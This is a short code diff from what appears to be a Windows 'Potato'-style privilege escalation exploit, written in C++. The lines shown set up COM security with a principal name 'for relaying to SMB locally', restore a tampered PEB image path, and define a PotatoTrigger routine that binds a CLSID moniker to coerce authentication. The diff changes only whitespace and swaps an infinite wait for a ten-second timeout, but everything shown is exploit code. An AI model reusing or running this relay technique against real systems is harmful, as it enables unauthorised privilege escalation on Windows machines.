@@ -28,11 +28,12 @@ void InitComServer() {
 	// init COM runtime
 	CoInitialize(NULL);
 	authInfo.dwAuthnSvc = RPC_C_AUTHN_WINNT;
-	authInfo.pPrincipalName = spnInfo;  // this is important for relaying to SMB locally
+	authInfo.pPrincipalName = spnInfo; 	// this is important for relaying to SMB locally
 	CoInitializeSecurity(NULL, 1, &authInfo, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING, NULL);
 	// Restore PEB ImagePathName
 	memcpy(pebInfo.PebBaseAddress->ProcessParameters->ImagePathName.Buffer, oldImagePathName, pebInfo.PebBaseAddress->ProcessParameters->ImagePathName.Length);
 }
+
 void PotatoTrigger(PWCHAR clsidStr, PWCHAR comPort, HANDLE hEventWait) {
 	IMoniker* monikerObj;
 	IBindCtx* bindCtx;
@@ -74,7 +75,7 @@ void PotatoTrigger(PWCHAR clsidStr, PWCHAR comPort, HANDLE hEventWait) {
 		printf("[!] CLSID %S not found. Error Bad path to object. Exiting...\n", clsidStr);
 		exit(-1);
 	}
-	if (hEventWait) WaitForSingleObject(hEventWait, INFINITE);
+	if (hEventWait) WaitForSingleObject(hEventWait, 10000);
 	IUnknownObj1Ptr->Release();
 	IUnknownObj1.Release();
 	bindCtx->Release();
